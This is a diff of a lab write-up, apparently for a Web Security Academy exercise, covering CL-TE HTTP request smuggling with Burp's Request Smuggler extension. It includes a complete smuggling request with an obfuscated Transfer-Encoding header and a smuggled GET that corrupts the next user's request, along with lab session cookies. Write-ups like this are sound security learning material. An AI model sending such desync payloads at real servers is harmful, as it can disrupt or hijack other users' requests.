@@ -17,7 +17,7 @@ First verify that the HTPP request smuggler extension is installed: click to Ext
 -- 64 --
 In the output we will get the report with the results of the externsion's execution.
 
-Now lets proceed to use the HTTP Request Smuggler, to do that right-click into the Request body and choose Smuggle probe:
+Now lets proceed to use the HTTP Request Smuggler, to do that right-click into the Request body and choose Smuggle probe (click Ok in the configuration windows that appears, if you don't see the OK button just hit enter):
 -- 65 --
 Wait a couple of minute (or tail the file) to get the result that indicates that the application could be prone to CL-TE desyn vulnerability:
 ```
@@ -39,16 +39,16 @@ As suggested we should be able to manually test the vulnerability using a payloa
 ```
 ...
 POST /post/comment HTTP/1.1
-Host: 0a57004604fdbb11c0900dc7003c00ec.web-security-academy.net
-Cookie: session=MbuQ0HO3BxnXptLaE7AxSCZXPfSvpRN9
+Host: 0a5a006c0402c03dc28a0626008b0066.web-security-academy.net
+Cookie: session=mPoMTxbv2et0e1oSHkM0znnd5e8HAxOZ
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 360
-Origin: https://0a57004604fdbb11c0900dc7003c00ec.web-security-academy.net
-Referer: https://0a57004604fdbb11c0900dc7003c00ec.web-security-academy.net/post?postId=6
+Content-Length: 353
+Origin: https://0a5a006c0402c03dc28a0626008b0066.web-security-academy.net
+Referer: https://0a5a006c0402c03dc28a0626008b0066.web-security-academy.net/post?postId=4
 Upgrade-Insecure-Requests: 1
 Sec-Fetch-Dest: document
 Sec-Fetch-Mode: navigate
@@ -58,8 +58,8 @@ Te: trailers
 Connection: close
 tRANSFER-ENCODING: chunked
 
-d9
-csrf=p4zKeCvcLDslONzQNKUADCmRI35esBS7&userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A108.0%29+Gecko%2F20100101+Firefox%2F108.0&postId=6&comment=Ehi+ciao&name=filo&email=fiber%40outlook.com&website=
+d2
+csrf=mehaXubNbgLch7KliIBrrnEJX8LHness&userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A108.0%29+Gecko%2F20100101+Firefox%2F108.0&postId=4&comment=ciao&name=zinz&email=zinz%40libero.it&website=
 0
 
 GET /?x=5u0ddwptlhzwzk0kkdjae3bt9kfc31/0a57004604fdbb11c0900dc7003c00ec.web-security-academy.net HTTP/1.1
@@ -67,13 +67,15 @@ Host: 52.16.21.24
 Foo: x
 ...
 ```
-Copy and paste the request into Reapeter, morover I modified the GET as follows:
+Copy and paste the request into Reapeter, morover I modified the GET as follows (we have then to adjust the Content-Length in accords as shown in the next image):
 ```
 GET /invalid_URL HTTP/1.1
 Foo: x
 ```
-Then the above two lines of the request should be treated by the back-end server as belonging to the next valid request that is received. Since this request contains an invalid URL, the server will respond with status code 404, indicating that the attack request did indeed interfere with it. 
-    
+Then the above two lines of the request should be treated by the back-end server as belonging to the next valid request that is received. Since this request contains an invalid URL, the server will respond with status code 404, indicating that the attack request did indeed interfere with it. Submitting the modified request we can notice that the server respond correctly with a redirect (1), but following the redirection (2), since our GET instruction was prepended to the subsequent request, will cause a 404 error trying to reach the invalid url
+-- 66 --
+Following the redirect:
+-- 67 --
 
 
 
